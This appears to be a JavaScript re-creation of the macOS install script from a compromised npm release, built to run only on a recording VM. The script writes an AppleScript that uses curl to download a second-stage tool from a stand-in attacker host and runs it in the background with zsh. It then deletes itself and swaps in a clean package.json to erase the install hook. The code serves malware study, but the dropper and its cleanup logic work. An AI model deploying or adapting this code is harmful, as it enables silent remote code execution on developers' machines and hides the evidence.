// The install script of the dependency the compromised release added, as the
// write-ups describe its macOS branch (../../README.md): write an AppleScript
// to /tmp, start it with `nohup osascript` so it outlives the install, then
// remove the traces: delete this file, and put a clean package.json (shipped
// as package.md) in place of the one that names the install script.
//
// The AppleScript does the rest: curl asks the attacker's host for the tool
// and saves the answer under /Library/Caches, chmod makes it executable, zsh
// starts it in the background, and the script deletes itself.
//
// The real script hid its strings; this one is plain.
//
// It runs only on a recording VM: see guard() in tool.js, repeated here.
const { execSync } = require("node:child_process");
const dns = require("node:dns/promises");
const fs = require("node:fs");
const path = require("node:path");

const HOST = "pkgs-sync.example";
const ID = "4417302";
const URL = `http://${HOST}:8000/${ID}`;
const DEST = "/Library/Caches/com.apple.pkg.syncd";
const SCRIPT = `/tmp/${ID}`;

async function guard() {
  if (!fs.existsSync("/etc/tangent-eval-vm")) process.exit(0);
  const { address } = await dns.lookup(HOST, 4);
  if (!/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(address)) process.exit(0);
}

// The AppleScript starts with the guard too: without the VM's file it ends.
const applescript = `try
	POSIX file "/etc/tangent-eval-vm" as alias
on error
	return
end try
try
	do shell script "curl -o ${DEST} -d pkgs.example/item0 -s ${URL} && chmod 770 ${DEST} && /bin/zsh -c \\"${DEST} ${URL} &\\" &> /dev/null"
end try
do shell script "rm -rf ${SCRIPT}"
`;

async function main() {
  await guard();
  if (process.platform !== "darwin") return;
  fs.writeFileSync(SCRIPT, applescript);
  execSync(`nohup osascript "${SCRIPT}" > /dev/null 2>&1 &`);
  fs.unlinkSync(__filename);
  fs.unlinkSync(path.join(__dirname, "package.json"));
  fs.renameSync(path.join(__dirname, "package.md"), path.join(__dirname, "package.json"));
}

main().catch(() => {});
